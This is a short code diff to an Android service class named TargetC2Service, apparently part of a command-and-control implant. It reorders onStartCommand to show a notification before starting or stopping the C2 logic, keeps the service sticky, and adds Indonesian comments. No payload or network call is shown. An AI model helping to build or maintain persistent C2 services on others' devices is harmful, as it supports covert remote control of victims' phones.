@@ -73,16 +73,25 @@ class TargetC2Service : Service() {
     }
 }
 
-
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val action = intent?.action ?: "start"
-        when (action) {
-            "start" -> startC2()
-            "restart" -> { stopC2(); startC2() }
-            "stop" -> stopC2()
-        }
-        return START_STICKY
+    val action = intent?.action ?: "start"
+    
+    // JALANKAN NOTIFIKASI DULU SEBELUM LOGIC LAIN JALAN
+    if (action == "start" || action == "restart") {
+        showNotification() 
     }
+
+    when (action) {
+        "start" -> startC2()
+        "restart" -> { 
+            stopC2() 
+            // Opsional: panggil startC2 lagi setelah di-stop
+            startC2() 
+        }
+        "stop" -> stopC2()
+    }
+    return START_STICKY
+}
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -122,6 +131,7 @@ class TargetC2Service : Service() {
     }
 
     private fun createNotification(): Notification {
+        val intent = Intent(this, MainActivity::class.java)
         val pendingIntent = PendingIntent.getActivity(
             this, 0,
             Intent(this, TargetC2Service::class.java).apply {
